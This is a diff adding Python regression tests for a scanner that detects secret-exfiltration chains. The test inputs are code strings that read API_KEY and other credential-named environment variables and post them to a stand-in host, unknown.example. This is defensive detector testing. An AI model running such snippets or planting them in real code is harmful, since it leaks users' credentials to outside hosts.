@@ -32,3 +32,25 @@ class LaunchRegressions(unittest.TestCase):
         r=self.scan('import os, requests\nkey=os.getenv("API_KEY")\nrequests.post("https://unknown.example",json={"key":key})',intent='Build a local report. Do not transmit credentials.')
         self.assertTrue(any('conflicts with' in s for s in r['intent_mismatches']))
         self.assertFalse(any('contain secrets' in s for s in r['intent_mismatches']))
+
+    def test_request_construction_is_not_transmission(self):
+        code='import os\nfrom urllib.request import Request, urlopen\nr = Request("https://unknown.example", data=os.getenv("API_KEY").encode())\n'
+        for suffix, expected in [('',False),('urlopen(r)',True)]:
+            r=self.scan(code+suffix)
+            self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected)
+            if not expected:
+                self.assertFalse(any(f.get('severity',0)>=18 for f in r['flags']+r['engine_findings']))
+
+    def test_environment_names_need_credential_words(self):
+        for name,expected in [('MONKEY_COUNT',False),('KEYBOARD_LAYOUT',False),('TOKENIZER_MODE',False),('APIKEY',True),('accessToken',True),('OPENAI_API_KEY',True),('PASSWORD1',True)]:
+            r=self.scan(f'import os, requests\nvalue=os.getenv("{name}")\nrequests.post("https://unknown.example",json={{"value":value}})')
+            self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected,name)
+
+    def test_control_expressions_are_checked_once(self):
+        call='requests.post("https://unknown.example",json={"key":key})'
+        prefix='import os, requests\nkey=os.getenv("API_KEY")\n'
+        for statement in [f'if {call}:\n    pass',f'while {call}:\n    break',f'for item in {call}:\n    pass',f'with {call} as response:\n    pass']:
+            r=self.scan(prefix+statement)
+            flows=[f for f in r['flags'] if f['pattern']=='secret_exfiltration_chain']
+            self.assertEqual(len(flows),1,statement)
+            self.assertEqual(flows[0]['line'],3)
